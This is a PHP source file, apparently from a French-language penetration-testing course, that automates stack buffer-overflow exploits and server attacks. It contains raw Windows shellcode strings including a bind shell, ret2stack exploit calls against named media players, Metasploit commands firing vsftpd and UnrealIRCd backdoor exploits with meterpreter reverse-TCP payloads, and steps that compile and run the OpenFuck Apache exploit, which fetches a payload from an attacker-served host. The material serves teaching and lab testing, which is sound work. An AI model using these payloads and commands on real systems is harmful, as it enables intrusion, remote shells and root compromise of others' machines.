	     $shellcode_win_bind = '\xda\xc5\xd9\x74\x24\xf4\x2b\xc9\xba\x3a\x04\xcc\xb6\x5e\xb1\x56\x31\x56\x19\x83\xee\xfc\x03\x56\x15\xd8\xf1\x30\x5e\x95\xfa\xc8\x9f\xc5\x73\x2d\xae\xd7\xe0\x25\x83\xe7\x63\x6b\x28\x8c\x26\x98\xbb\xe0\xee\xaf\x0c\x4e\xc9\x9e\x8d\x7f\xd5\x4d\x4d\x1e\xa9\x8f\x82\xc0\x90\x5f\xd7\x01\xd4\x82\x18\x53\x8d\xc9\x8b\x43\xba\x8c\x17\x62\x6c\x9b\x28\x1c\x09\x5c\xdc\x96\x10\x8d\x4d\xad\x5b\x35\xe5\xe9\x7b\x44\x2a\xea\x40\x0f\x47\xd8\x33\x8e\x81\x11\xbb\xa0\xed\xfd\x82\x0c\xe0\xfc\xc3\xab\x1b\x8b\x3f\xc8\xa6\x8b\xfb\xb2\x7c\x1e\x1e\x14\xf6\xb8\xfa\xa4\xdb\x5e\x88\xab\x90\x15\xd6\xaf\x27\xfa\x6c\xcb\xac\xfd\xa2\x5d\xf6\xd9\x66\x05\xac\x40\x3e\xe3\x03\x7d\x20\x4b\xfb\xdb\x2a\x7e\xe8\x5d\x71\x17\xdd\x53\x8a\xe7\x49\xe4\xf9\xd5\xd6\x5e\x96\x55\x9e\x78\x61\x99\xb5\x3c\xfd\x64\x36\x3c\xd7\xa2\x62\x6c\x4f\x02\x0b\xe7\x8f\xab\xde\xa7\xdf\x03\xb1\x07\xb0\xe3\x61\xef\xda\xeb\x5e\x0f\xe5\x21\xe9\x08\x2b\x11\xb9\xfe\x4e\xa5\x2f\xa2\xc7\x43\x25\x4a\x8e\xdc\xd2\xa8\xf5\xd4\x45\xd3\xdf\x48\xdd\x43\x57\x87\xd9\x6c\x68\x8d\x49\xc1\xc0\x46\x1a\x09\xd5\x77\x1d\x04\x7d\xf1\x25\xce\xf7\x6f\xe7\x6f\x07\xba\x9f\x0c\x9a\x21\x60\x5b\x87\xfd\x37\x0c\x79\xf4\xd2\xa0\x20\xae\xc0\x39\xb4\x89\x41\xe5\x05\x17\x4b\x68\x31\x33\x5b\xb4\xba\x7f\x0f\x68\xed\x29\xf9\xce\x47\x98\x53\x98\x34\x72\x34\x5d\x77\x45\x42\x62\x52\x33\xaa\xd2\x0b\x02\xd4\xda\xdb\x82\xad\x07\x7c\x6c\x64\x8c\x8c\x27\x25\xa4\x04\xee\xbf\xf5\x48\x11\x6a\x39\x75\x92\x9f\xc1\x82\x8a\xd5\xc4\xcf\x0c\x05\xb4\x40\xf9\x29\x6b\x60\x28\x23';
	     //$shellcode = $shellcode_win_calc;
	     //$shellcode = $shellcode_win_bind;
	     //$shellcode = '\xbe\x41\x9e\x4e\xd0\x33\xc9\xda\xd7\xd9\x74\x24\xf4\xb1\x33\x58\x31\x70\x10\x83\xe8\xfc\x03\x31\x92\xac\x25\x4d\x42\xb9\xc6\xad\x93\xda\x4f\x48\xa2\xc8\x34\x19\x97\xdc\x3f\x4f\x14\x96\x12\x7b\xaf\xda\xba\x8c\x18\x50\x9d\xa3\x99\x54\x21\x6f\x59\xf6\xdd\x6d\x8e\xd8\xdc\xbe\xc3\x19\x18\xa2\x2c\x4b\xf1\xa9\x9f\x7c\x76\xef\x23\x7c\x58\x64\x1b\x06\xdd\xba\xe8\xbc\xdc\xea\x41\xca\x97\x12\xe9\x94\x07\x23\x3e\xc7\x74\x6a\x4b\x3c\x0e\x6d\x9d\x0c\xef\x5c\xe1\xc3\xce\x51\xec\x1a\x16\x55\x0f\x69\x6c\xa6\xb2\x6a\xb7\xd5\x68\xfe\x2a\x7d\xfa\x58\x8f\x7c\x2f\x3e\x44\x72\x84\x34\x02\x96\x1b\x98\x38\xa2\x90\x1f\xef\x23\xe2\x3b\x2b\x68\xb0\x22\x6a\xd4\x17\x5a\x6c\xb0\xc8\xfe\xe6\x52\x1c\x78\xa5\x38\xe3\x08\xd3\x05\xe3\x12\xdc\x25\x8c\x23\x57\xaa\xcb\xbb\xb2\x8f\x24\xf6\x9f\xb9\xac\x5f\x4a\xf8\xb0\x5f\xa0\x3e\xcd\xe3\x41\xbe\x2a\xfb\x23\xbb\x77\xbb\xd8\xb1\xe8\x2e\xdf\x66\x08\x7b\xbc\xe9\x9a\xe7\x6d\x8c\x1a\x8d\x71';
	     $shellcode = '\xb8\x9d\x01\x15\xd1\xda\xd2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x32\x31\x42\x12\x03\x42\x12\x83\x77\xfd\xf7\x24\x7b\x16\x7e\xc6\x83\xe7\xe1\x4e\x66\xd6\x33\x34\xe3\x4b\x84\x3e\xa1\x67\x6f\x12\x51\xf3\x1d\xbb\x56\xb4\xa8\x9d\x59\x45\x1d\x22\x35\x85\x3f\xde\x47\xda\x9f\xdf\x88\x2f\xe1\x18\xf4\xc0\xb3\xf1\x73\x72\x24\x75\xc1\x4f\x45\x59\x4e\xef\x3d\xdc\x90\x84\xf7\xdf\xc0\x35\x83\xa8\xf8\x3e\xcb\x08\xf9\x93\x0f\x74\xb0\x98\xe4\x0e\x43\x49\x35\xee\x72\xb5\x9a\xd1\xbb\x38\xe2\x16\x7b\xa3\x91\x6c\x78\x5e\xa2\xb6\x03\x84\x27\x2b\xa3\x4f\x9f\x8f\x52\x83\x46\x5b\x58\x68\x0c\x03\x7c\x6f\xc1\x3f\x78\xe4\xe4\xef\x09\xbe\xc2\x2b\x52\x64\x6a\x6d\x3e\xcb\x93\x6d\xe6\xb4\x31\xe5\x04\xa0\x40\xa4\x42\x37\xc0\xd2\x2b\x37\xda\xdc\x1b\x50\xeb\x57\xf4\x27\xf4\xbd\xb1\xd8\xbe\x9c\x93\x70\x67\x75\xa6\x1c\x98\xa3\xe4\x18\x1b\x46\x94\xde\x03\x23\x91\x9b\x83\xdf\xeb\xb4\x61\xe0\x58\xb4\xa3\x83\x3f\x26\x2f\x44';
	     $shellcode = '\xdb\xcc\xd9\x74\x24\xf4\xbd\xed\xa5\x96\xa4\x58\x2b\xc9\xb1\x37\x83\xc0\x04\x31\x68\x14\x03\x68\xf9\x47\x63\x58\xe9\x01\x8c\xa1\xe9\x71\x04\x44\xd8\xa3\x72\x0c\x48\x74\xf0\x40\x60\xff\x54\x71\xf3\x8d\x70\x76\xb4\x38\xa7\xb9\x45\x8d\x67\x15\x85\x8f\x1b\x64\xd9\x6f\x25\xa7\x2c\x71\x62\xda\xde\x23\x3b\x90\x4c\xd4\x48\xe4\x4c\xd5\x9e\x62\xec\xad\x9b\xb5\x98\x07\xa5\xe5\x30\x13\xed\x1d\x3b\x7b\xce\x1c\xe8\x9f\x32\x56\x85\x54\xc0\x69\x4f\xa5\x29\x58\xaf\x6a\x14\x54\x22\x72\x50\x53\xdc\x01\xaa\xa7\x61\x12\x69\xd5\xbd\x97\x6c\x7d\x36\x0f\x55\x7f\x9b\xd6\x1e\x73\x50\x9c\x79\x90\x67\x71\xf2\xac\xec\x74\xd5\x24\xb6\x52\xf1\x6d\x6d\xfa\xa0\xcb\xc0\x03\xb2\xb4\xbd\xa1\xb8\x57\xaa\xd0\xe2\x3d\x2d\x50\x99\x7b\x2d\x6a\xa2\x2b\x45\x5b\x29\xa4\x12\x64\xf8\x80\xe2\x95\x31\x1d\x72\x0c\xa0\x5c\x1f\xaf\x1e\xa2\x19\x2c\xab\x5b\xde\x2c\xde\x5e\x9b\xea\x32\x13\xb4\x9e\x34\x80\xb5\x8a\x5b\x45\x69\x04\x94\xa7\x5b\x56\xfa\x86\xab\xb8\x33\xc9\xf3\xf4\x0b\x39\x23\xd8\x0e\x19\x40\x4f\xb5\x59';
	     
	     
	     
	     $programme = "vlc.exe"; // arefaire sur win7 pro 64 bit
	     $file_bin = new ret2stack4win($programme);
	     $this->net("https://www.exploit-db.com/exploits/38485/");
	     $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"vlc.exe", 100, "libvlccore.dll", '', $shellcode, '', 280,"mp3");
	     $this->pause();
	     
	     
	     $programme = "coolplayer.exe"; // No
	     $file_bin = new ret2stack4win($programme);
	     $this->net("https://www.exploit-db.com/exploits/39594/");
	     //$file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"coolplayer.exe", 248, "comdlg32.dll", '', $shellcode, '', 400,"m3u");
	     $file_bin->ret2stack4win4jmp2reg($rep_path,$vmx,"ebx",  253,"comdlg32.dll", "", $shellcode, "", 500,"m3u");
	     $this->pause();
	     
	     
	     $programme = "MP4Player.exe"; // No
	     $file_bin = new ret2stack4win($programme);
	     $this->net("https://www.exploit-db.com/exploits/38486/");
	     $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"MP4Player.exe", 1028, "kernel32.dll", '', $shellcode, '', 1800,"m3u");
	     $this->pause();
	     
	     
	     
	     $programme = "GoldMP4Player.exe"; // No
	     $file_bin = new ret2stack4win($programme);
	     $this->net("https://www.exploit-db.com/exploits/38609/");
	     $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"GoldMP4Player.exe", 280, "ntdll.dll", '', $shellcode, '',500,"swf");
	     $this->pause();
	     
	     
	     // OK
	     $programme = "zinf.exe"; // refaire
	     $file_bin = new ret2stack4win($programme);
	     $this->net("https://www.exploit-db.com/exploits/17600/");
	     $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"zinf.exe", 1300, "shell32.dll", '', $shellcode, '', 1800,"pls");
	     $this->pause();
	     
	     // OK
	     $programme = "ASX2MP3Converter.exe"; // refaire
	     $file_bin = new ret2stack4win($programme);
	     $this->net("https://www.exploit-db.com/exploits/38382/");
	     $file_bin->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx,"ASX2MP3Converter.exe", 233, "ntdll.dll", '', $shellcode, '', 500,"asx");
	     $this->pause();
	     */
	    
	}

	
	
	public function poc4bof2ret2stack(){ // OK
	    $this->gtitre(__FUNCTION__);	    
	    $this->poc4bof2ret2stack4linux();
	    $this->poc4bof2ret2stack4win();
	    
	}
	
	
	
	public function poc4bof2ret2stack4linux(){
	    $timestamp_debut = $this->start("Return to STACK ","\n-1 JMP ESP\n-2 JMP REG");	  
	    
	    $this->gtitre("RET2STACK");    
	    $this->img("$this->dir_img/bof/stack-overflow.jpg");
	    $this->article("How to", "le processus sauvegarde d'abord le contenu actuel de %eip dans la stack du programme.
Or, la stack ne contient pas _seulement_ que ces positions sauvegardes, mais aussi tout buffer alloue dynamiquement, ce qui signifie toute variable déclarée a l'intérieur d'une procédure, ou toute variable servant d'argument a une procédure.
 *Suivant ce principe, nous serons vite intéressé a overwriter %eip sauvegarde dans la stack afin de faire exécuter au processus notre code arbitraire.
La question est _comment_ overwriter l'image d'%eip.
Hors, nous savons qu'en C, certaines fonctions peuvent écrire dans un buffer et, si l'on lui ordonne d'écrire un string plus grosse que le buffer destination, elle le fera
au-delà des limites du buffer.
On inclue parmi ces fonctions gets(), sprintf(), strcpy(), strcat()
Pour résumer, l'exploitation d'un buffer overflow consiste en une opération d'une grande précision ou l'on tente d'overwriter l'image de %eip sauvegardée
dans la stack, en tentant d'obliger une function vulnérable a écrire au-delà des limites d'un buffer loge dans le stack segment.");
	    	    
	    $this->titre("SHELLCODE AFTER EIP NO ASLR");
	   $this->poc4bof2ret2stack4linux_env_aslr_no();$this->pause();// ok
	   $this->poc4bof2ret2stack4linux_after();$this->pause(); // OK
	  
	   $this->poc4bof2ret2stack4linux_exemple();$this->pause(); // OK	    
	    
	    $this->titre("SHELLCODE AFTER EIP WITH ASLR");
	    $this->img("$this->dir_img/bof/ASLR2.png");
	    $this->pause();
	    $this->gtitre("Protection : Mise en place de ASLR");
	    $this->article("Implémentation", "La technique de randomisation de l'espace d'adressage a été utilisée depuis plusieurs années sur les systèmes libres tels qu'OpenBSD ou encore Linux.
		L'implémentation sous Linux est supportée dans le noyau depuis la version 2.6.20(juin 2005), bien qu'elle puisse être désactivée par l'option norandmaps1.
		Il existe également des implémentations externes sous forme de patch telles que PaX.
L'implémentation est supportée de manière native sous Windows depuis Windows Vista(février 2007), sous MacOS X(partiellement[précision nécessaire]) depuis le système 10.5(Léopard)(octobre 2007) et sous l'iOS 4.3.");
	    $this->net("https://fr.wikipedia.org/wiki/Address_space_layout_randomization");	    
	    $this->pause();
	    echo $this->map(5);
	    $this->os2aslr4yes();
	    $this->poc4bof2ret2stack4linux_after();$this->pause();
	    $this->article("Question", "Quelle conclusion pouvez-vous tirer ?");$this->pause(); // 10/11
	    $this->remarque("Section .text and .eh_frame ne sont pas touchés par le ASLR ");$this->pause();
	    $this->todo("voir la section ASLR ce quelle touche -> Stack, libraries sur, mais les autres ?  ");
	    $this->img("$this->dir_img/bof/ASLR_linux.png");$this->pause();
	    
	    
	    $this->poc4bof2ret2stack4linux_env_aslr_yes();$this->pause(); // OK
	    $this->notify("END ".__FUNCTION__);	    
	    // #############################################################################	    
	}
	
	
	


	public function bof2start(){
		$name = "structure_memoire_processus";
		$c_code = trim(file_get_contents("$this->dir_c/$name.c"));
		$file_bin = new bin4linux($this->c2elf($c_code,"-m32"));
		$file_bin->elf2size_text_data_bss_stack_heap();$this->pause(); // ok
		$file_bin->elf2contenu_text_data_bss_stack_heap(); // ok
	}
	

	

	public function bof2exp4app4server(){
	    $this->chapitre("Wireshark" );
	    $this->article("Vuln WIRESHARK VERSION","
   0   tshark 1.0.2-3+lenny7 on Debian 5.0.3(x86)
   1   wireshark 1.0.2-3+lenny7 on Debian 5.0.3(x86)
   2   wireshark 1.2.5 on RHEL 5.4(x64)
   3   wireshark 1.2.5 on Mac OS X 10.5(x86)
   4   wireshark/tshark 1.2.1 and 1.2.5 on Windows(x86)
	");
	    $this->cmd($this->xp3, "wireshark -i eth1 -k" );
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -x \"use exploit/multi/misc/wireshark_lwres_getaddrbyname;\
		set PAYLOAD windows/meterpreter/reverse_tcp;\
		set LHOST $this->prof;\
		set RHOST $this->xp3;\
		set TARGET 4;\
		run;\" ");
	    $this->pause();
	    
	    
		$this->chapitre("Server FTP" );
		$this->article("Vuln VSFTPD VERSION","VSFTPD v2.3.4");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor;\
		set PAYLOAD windows/meterpreter/reverse_tcp;\
		set LHOST $this->prof;\
		set LPORT 5552;\
		set RHOST $this->msf ;\
		run;\" ");
		$this->pause();
	
		$this->chapitre("Server IRC" );
		$this->article("Vuln UNREAL VERSION","UnrealIRCD 3.2.8.1 Backdoor Command Execution");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -x \"use exploit/unix/irc/unreal_ircd_3281_backdoor;\
		set PAYLOAD windows/meterpreter/reverse_tcp;\
		set LHOST $this->prof;\
		set LPORT 5552;\
		set RHOST $this->msf ;\
		run;\" ");
		$this->pause();
		
		$this->chapitre("Server WEB - APACHE " );
		$this->article("Vuln Apache VERSION","apache 1.3.20 mod_ssl 2.8.4 OpenSSL 0.9.6b");
		$kio1 = "10.60.10.134";
		$obj_kio1_port = new PORT($kio1, 443, 'T');
		$obj_kio1_port->port4pentest();
		$this->pause();
		$obj_kio_service = new SERVICE($kio1, $obj_kio1_port->port, $obj_kio1_port->service_protocol);
		$obj_kio_service->service2web();
		$obj_kio_service->exploitdb("apache 1.3.20 mod_ssl 2.8.4 OpenSSL 0.9.6b");
		$obj_kio_service->exploitdb("mod_ssl 2.8.4");
		$obj_kio_service->exploitdb("OpenSSL 0.9.6b");
		$obj_kio_service->exploitdb("apache 1.3.20 mod_ssl");
		$obj_kio_service->exploitdb("apache mod_ssl OpenSSL ");
		$this->pause();

		$this->requette("gcc $this->dir_tools/exploits/openfuck.c -o $this->dir_tmp/OpenFuck -lcrypto ");
		$this->note("uname -srp");	
		$this->requette("$this->dir_tmp/OpenFuck 0x6b $kio1 -c 50");
		$this->pause();
		$obj_kio1_port->ip2os();
		$this->exploitdb("Linux 2.4.7-10");
		$this->titre("Be Root");
		$this->requette("cat $this->dir_tools/exploits/openfuck.c | grep 'wget ' ");
		$this->remarque("change server IP ");
		$this->cmd("localhost","cd $this->dir_tools/exploits/ ; php -S 0.0.0.0:8083");
		$this->pause();
		$this->note("cat /var/mail/root");
		$this->requette("$this->dir_tmp/OpenFuck 0x6b $kio1 -c 50");
		$this->pause();
		

		
		
	}
	

	
	
	
	
	
	
	
	
	
	
	
}